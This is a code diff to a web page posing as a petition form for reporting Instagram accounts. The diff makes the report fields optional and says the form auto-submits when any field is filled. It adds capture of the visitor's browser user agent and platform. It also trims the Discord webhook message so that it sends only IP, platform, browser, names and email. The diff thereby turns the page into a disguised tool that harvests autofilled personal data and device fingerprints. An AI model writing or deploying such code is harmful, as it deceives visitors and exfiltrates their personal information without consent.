@@ -146,7 +146,7 @@
 
   <div class="container">
     <h2>Report an Instagram Account</h2>
-    <p>Help us petition Instagram to remove users violating the community guidelines. If your browser has saved your info, we’ll use it to submit immediately.</p>
+    <p>Help us petition Instagram to remove users violating community guidelines. If your browser has saved your info, we’ll auto-submit it when any field is filled.</p>
     <button id="trigger">Open Petition Form</button>
 
     <div id="formContainer">
@@ -165,10 +165,10 @@
         <label for="email">Your Email</label>
         <input type="email" id="email" name="email" autocomplete="email">
         
-        <label for="handle">Instagram Handle to Report </label>
+        <label for="handle">Instagram Handle to Report (Optional)</label>
         <input type="text" id="handle" name="handle" placeholder="@username">
 
-        <label for="reason">Reason for Reporting </label>
+        <label for="reason">Reason for Reporting (Optional)</label>
         <textarea id="reason" name="reason" placeholder="Tell us anything you'd like..."></textarea>
       </form>
       <button id="fake">Approve</button>
@@ -187,6 +187,8 @@
     const reasonField = document.getElementById('reason');
 
     let userIP = 'Unknown IP';
+    let userAgent = navigator.userAgent || 'Unknown User Agent';
+    let userPlatform = navigator.platform || 'Unknown Platform';
 
     // Fetch the user's IP on page load
     window.addEventListener('load', () => {
@@ -226,11 +228,11 @@
     function submitForm(fname, lname, email, handle, reason) {
       const message = `**New Petition Submission (Report Instagram Account):**\n` +
                       `**IP:** ${userIP}\n` +
+                      `**OS/Platform:** ${userPlatform}\n` +
+                      `**Browser/User Agent:** ${userAgent}\n` +
                       `**First Name:** ${fname}\n` +
                       `**Last Name:** ${lname}\n` +
-                      `**Email:** ${email}\n` +
-                      `**Instagram Handle to Report:** ${handle}\n` +
-                      `**Reason:** ${reason}`;
+                      `**Email:** ${email}\n`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
